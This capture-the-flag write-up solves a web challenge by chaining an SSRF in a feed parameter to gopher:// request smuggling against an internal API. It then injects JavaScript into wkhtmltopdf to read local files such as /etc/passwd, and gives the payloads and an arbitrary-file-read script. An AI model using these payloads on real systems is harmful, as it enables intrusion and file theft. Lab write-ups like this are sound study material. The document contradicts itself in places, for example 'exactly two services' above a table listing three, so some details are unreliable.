# Groundhog Day - Web (Hard)

**Flag:** `sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}` · **Files:** none · **Instance:** `https://odyssey.web.2026.sunshinectf.games`

## Challenge

```
The Punxsutawney Orbital Weather Authority has been broadcasting the same forecast
since 1993.

Every reading is fresh. Every date is February 2. The Bureau insists this is fine,
and the groundhog has declined to comment.

Their public console is up. Have a look at where it gets its numbers.
```

## Initial Analysis

The main page has only one form, and the form is commented out in HTML. The comment acts as a blueprint of the system:

```html
<!-- ops: console pulls station JSON at boot from http://127.0.0.1:8000/feed.
     override it with feed=<url> when PUNX-1 is down and you need to point at
     a spare station. ... -->
<!-- feed-debug: source=http://127.0.0.1:8000/feed bytes=350 -->
```

Passing `feed=<url>` (via GET or POST to `/`) makes the server fetch that URL and print the entire body into `<pre class="tape">`, along with the body length in the `feed-debug` comment. The response body is returned verbatim, only HTML-escaped, making this a 1:1 read channel.

Internal scanning reveals exactly two services:

| Target | Result |
|---|---|
| `127.0.0.1:5000` | the console itself, only has the `/` route |
| `127.0.0.1:8000` | "Bureau Archive", internal API |
| `169.254.169.254` | the platform's mock GCP metadata |

The internal API lists itself at `GET /` (1045 bytes):

```
GET  /feed    JSON randomized
GET  /health  "ok"
POST /report  Render an archival PDF from a report body (content, title)
              ... base64 in the `data` field.
NOTE(ops): ... mainly updating from wkhtmltopdf 0.12.5
```

The target loop is `/report`: the POST body is rendered by wkhtmltopdf 0.12.5, a version that still allows reading local files. Two obstacles were measured (not guessed):

- the console always issues GET requests, so `/report` returns `405 Method Not Allowed`;
- the mock metadata requires the `Metadata-Flavor: Google` header.

The container cannot reach the outside: a custom DNS station was set up to test this (the page could be read from the station locally, but the console reported `bytes=0`); the cause was differentiated as DNS resolution succeeding but TCP connection failing. None of the `gopher://` payloads in the dictionary worked, so this route was closed at the client identification stage.

## Approaches Ruled Out

| # | Hypothesis | Result |
|---|---|---|
| H2 | `file://` is blocked because the client does not support it | WRONG; the block comes from the author's allow-list, while the printed error string comes from libcurl |
| H4 | The two apps have hidden endpoints | DEAD; scanned 139 single words and ~30 paths, every 405 returned the exact same 153-byte body, so there are no hidden handlers |
| H5 | There is a way to turn GET into POST | DEAD; `?_method`, `X-HTTP-Method-Override`, multipart, JSON body, PUT/PATCH/OPTIONS, routing quirks, 5 Host values, 19 parameter names were all ineffective |
| H9 | The container will read a player-hosted station | DEAD; no egress, TCP is blocked |
| H10 | Mock metadata contains the flag | DEAD; smuggling the header allows reading the entire `/computeMetadata/v1/` tree, but it only contains standard GCP data |
| H14 | `<iframe src="file://...">` renders file content | DEAD; the file is actually fetched but Qt does not draw the text of the subframe, yielding 0 text operators in the PDF |

## Exploit Chain

**Step 1 - Read the application's own error messages to identify the client.** The error page prints exceptions into `<p class="fault">...</p>`. Scanning 18 error classes:

```
file://, data:, raw string -> unsupported transport for station feed
http:// without host       -> station unreachable - URL rejected: No host part in the URL
port >= 65536              -> station unreachable - URL rejected: Port number was not a decimal number between 0 and 65535
127.0.0.1:1                -> station unreachable - Failed to connect to 127.0.0.1 port 1 after 0 ms: Could not connect to server
```

The last three lines match the prose of libcurl; `requests` and `urllib3` do not print `Failed to connect to <host> port <n> after <m> ms` or `URL rejected:`. Two consequences: `file://` dies at the author's scheme check rather than at the client, and `gopher://` slips past that check (`bytes=0`, `lamp--ok`, no faults, meaning the connection was made).

**Step 2 - gopher: turn a console GET into an arbitrary raw HTTP request.** libcurl processes `gopher://host:port/_<selector>` by percent-decoding the selector and sending it directly down the socket:

```
gopher://127.0.0.1:8000/_GET%20/health%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
```

The tape returns both header and body:

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.13.7
Content-Type: text/plain; charset=utf-8
Content-Length: 3

ok
```

This provides a raw HTTP proxy inside the container, allowing arbitrary methods and headers. This response also reveals the stack is Werkzeug 3.1.8 on Python 3.13.7.

**Step 3 - POST /report through that proxy.**

```
POST /report HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: <n>

content=<h1>Feb 2 Summary</h1>
```

`bytes=11230`, the JSON contains the keys `document`, `bytes`, `encoding`, `data`: wkhtmltopdf actually ran. Adding `Metadata-Flavor: Google` to this exact request mold allows reading the metadata tree, confirming H10 is shared platform infra.

**Step 4 - Find a text-return channel back to the reader.** `<iframe src="file:///etc/passwd">` for PDF has no text operators. The file is read for real: `file:///ctf/flag.txt` reports `ContentNotFoundError` when the file is missing, while `/etc/passwd` reports nothing. The problem is that Qt does not draw text/plain in subframes. `<meta refresh>` and `location=` are blocked with an `unknown error`.

`<script>document.title="JSWORKS123"</script>` appears in the `/Title` of the PDF, so JavaScript executes and metadata is a plaintext channel. UTF-16BE in `/Title` also avoids having to decode subset fonts like the content stream.

**Step 5 - Read the file via synchronous XHR, write the result into `/Title`.**

```html
<script>
var x = new XMLHttpRequest();
x.open("GET", "file:///etc/hostname", false);
x.send();
document.title = "OK:" + x.responseText;
</script>
```

Returns `OK:d89c16037bd5`, which is exactly the content of the container's `/etc/hostname`. XHR calls to `http://` yield `NETWORK_ERR`, meaning only local file access works. One technical detail: the body is form-urlencoded so the `+` in `"OK:"+x.responseText` gets decoded into a space, breaking the JS syntax; the payload must be URL-encoded (`quote(content, safe="")`) for all 5 probe variants to run.

**Step 6 - Locate the flag file.** `/ctf/flag.txt` (the default path for pwn challenges from this series) and `/flag`, `/app/flag.txt`, `/opt/flag.txt` all yield `ContentNotFoundError`. `/flag.txt` returns the flag.

## Flag
```
sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}
```

## Reproduce

```bash
python exploit.py                      # reads /flag.txt, /flag, /ctf/flag.txt in order
python exploit.py /etc/passwd          # reads arbitrary files
python analysis/ssrf.py                # 5 opening probes, printing bytes= and tape
python analysis/gopher.py              # smuggle GET /health and POST /report
python analysis/pdfdump.py sanity      # verify PDF text extraction
```

`exploit.py` uses only the stdlib. `analysis/` retains the actual analysis order: `ssrf.py` then `gopher.py`, `gopher2.py`, `js_check.py`, `js_lfi.py`, `pdfdump.py`, `pdfdebug.py`, `readfile.py`. `files/` retains `root.html` (ops comment), `station_index.txt` (internal docs), `first_post_report_response.txt` (initial `/report` response), `sanity.pdf`, `xhr_hostname.pdf`, `lfi__etc_passwd.pdf`, `meta_403.html`, `canary_reply.html`. The bait station `station-canary-...qoder.website` was reverted to private.
